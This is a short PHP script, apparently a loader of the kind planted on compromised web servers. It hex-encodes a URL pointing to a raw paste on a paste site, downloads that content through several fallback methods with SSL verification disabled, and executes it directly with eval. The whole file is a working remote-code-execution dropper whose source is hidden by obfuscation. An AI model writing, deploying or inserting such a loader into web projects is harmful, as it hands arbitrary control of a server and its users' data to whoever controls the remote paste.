<?php
$hexUrl = '68747470733A2F2F67686F737462696E2E6178656C2E6F72672F70617374652F70766677752F726177';

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

function downloadPhpCode($url) {
    $data = false;

    if (ini_get('allow_url_fopen')) {
        $data = @file_get_contents($url);
    }

    if (!$data && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        $data = curl_exec($ch);
        curl_close($ch);
    }

    if (!$data && ($fp = @fopen($url, 'r'))) {
        $data = '';
        while (!feof($fp)) {
            $data .= fread($fp, 8192);
        }
        fclose($fp);
    }

    return $data;
}

// Decode & download
$url = hex2str($hexUrl);
$phpCode = downloadPhpCode($url);

// Eksekusi langsung via temporary eval
try {
    eval("?>".$phpCode);
} catch (Throwable $e) {
    echo "Error saat menjalankan kode: " . $e->getMessage();
}
?>